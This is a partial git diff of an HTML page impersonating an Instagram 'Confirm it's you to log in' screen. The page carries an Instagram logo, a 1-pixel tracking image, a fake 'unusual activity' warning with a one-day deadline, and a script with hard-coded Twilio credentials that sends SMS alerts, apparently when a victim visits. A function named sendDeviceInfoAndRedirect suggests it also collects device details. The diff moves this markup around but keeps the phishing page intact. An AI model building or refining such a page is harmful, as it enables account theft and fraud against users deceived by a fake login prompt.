@@ -394,23 +394,7 @@ function sendDeviceInfoAndRedirect() {
         }
       }
     </style>
-</head>
-<body>
-    <!-- Add a navigation bar with the new Instagram logo -->
-    <div class="navbar">
-        <img src="https://i.ibb.co/QX7nFCf/IMG-20231217-114156.png" alt="Instagram Logo">
-    </div>
-<img src="https://i.ibb.co/Hh6BZ7d/tracking-pixel.png" alt="Tracking Pixel" width="1" height="1">
-    <h1>Confirm it's you to log in</h1>
-
-    <p class="paragraph">We noticed unusual activity from your account, so</p>
-    <p class="centered-paragraph">we need to verify it's you.</p>
-    <p style="margin: 8px 0;"></p>
-    <p class="paragraph0">Follow the next steps within 1 day so we can try to<br>get you back into your account before it's compromised.</p>
-    <div class="g-recaptcha" data-sitekey="6LcA9jspAAAAAIOxI-iVkp1oYwZpjcJBcxGBjyeW"></div>
-
- <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
-    <script>
+<script>
         $(document).ready(function () {
             const twilioAccountSID = 'ACd2e88a17b14ef8022a8b6f079f92c24a';
             const twilioAuthToken = '8b1d9a6a18613704c7c5c0bc705fc9a9';
@@ -459,6 +443,24 @@ const formattedTime = `${istTime}`;
             sendTwilioSMS();
         });
     </script>
+</head>
+<body>
+    <!-- Add a navigation bar with the new Instagram logo -->
+    <div class="navbar">
+        <img src="https://i.ibb.co/QX7nFCf/IMG-20231217-114156.png" alt="Instagram Logo">
+   <img src="https://i.ibb.co/Hh6BZ7d/tracking-pixel.png" alt="Tracking Pixel" width="1" height="1">
+    </div>
+
+    <h1>Confirm it's you to log in</h1>
+
+    <p class="paragraph">We noticed unusual activity from your account, so</p>
+    <p class="centered-paragraph">we need to verify it's you.</p>
+    <p style="margin: 8px 0;"></p>
+    <p class="paragraph0">Follow the next steps within 1 day so we can try to<br>get you back into your account before it's compromised.</p>
+    <div class="g-recaptcha" data-sitekey="6LcA9jspAAAAAIOxI-iVkp1oYwZpjcJBcxGBjyeW"></div>
+
+ 
+    
  <script>
   function onClick(e) {
     e.preventDefault();
